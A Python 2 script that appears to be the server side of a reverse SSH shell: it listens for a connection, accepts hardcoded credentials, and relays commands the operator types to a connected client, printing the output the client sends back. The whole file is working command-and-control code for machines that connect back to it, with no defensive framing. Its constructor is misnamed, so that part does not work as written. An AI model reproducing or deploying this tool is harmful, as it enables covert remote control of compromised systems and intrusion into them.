import socket
import paramiko
import threading
import sys
#using the key from the Paramiko demo files
host_key = paramiko.RSAKey(filename='test_rsa.key')

#We extend the Paramiko Server Interface
#ServerInterface is an interface to override for server support.

class Server (paramiko.ServerInterface):

    def _init_(self):
        self.event = threading.Event()

    #Determine if a channel request of a given type will be granted, and return 
    #OPEN_SUCCEEDED or an error code 
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    #determine if a given username and password supplied by the client is acceptable
    #for use in authentication    
    def check_auth_password(self, username, password):
        if (username == 'user') and (password == 'lovesthepython'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

#we store the server address and the server port
server = sys.argv[1]
ssh_port = int(sys.argv[2])

#we create a listening socket to receive connections
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print '[+] Listening for connection ...'
    client, addr = sock.accept()
except Exception,e:
    print '[-] Listen failed: ' + str(e)
    sys.exit(1)

print '[+] Got a connection from %s' % addr[0]

try:
    # Create a new SSH session over an existing socket, or socket-like object.
    # This only creates the Transport object; it doesn't begin the SSH session yet.
    bhSession = paramiko.Transport(client)
    # Add a host key to the list of keys used for server mode. When behaving as a server, 
    # the host key is used to sign certain packets during the SSH2 negotiation, so that
    # the client can trust that we are who we say we are.
    bhSession.add_server_key(host_key)
    # we create our server
    server = Server()
    try:
        # We negotiate a new SSH2 session as a server. 
        bhSession.start_server(server=server)
    except paramiko.SSHException, x:
        print '[-] SSH negotiation failed'

    # Return the next channel opened by the client over this transport, in server mode. 
    chan = bhSession.accept(20)
    print '[+] Authenticated'
    print chan.recv(1024)
    # Send Banner
    chan.send('Welcome to bh_ssh')
    while True:
        try:
            command = raw_input("Enter a command: ").strip('\n')
            if command != 'exit':
                chan.send(command)
                print chan.recv(1024) + '\n'
            else:
                chan.send('exit')
                print 'exiting'
                bhSession.close()
                raise Exception('exit')
        except KeyboardInterrupt:
            bhSession.close()
except Exception, e:
    print '[-] Caught exception: ' + str(e)
    try:
        bhSession.close()
    except:
        pass
    sys.exit(1)

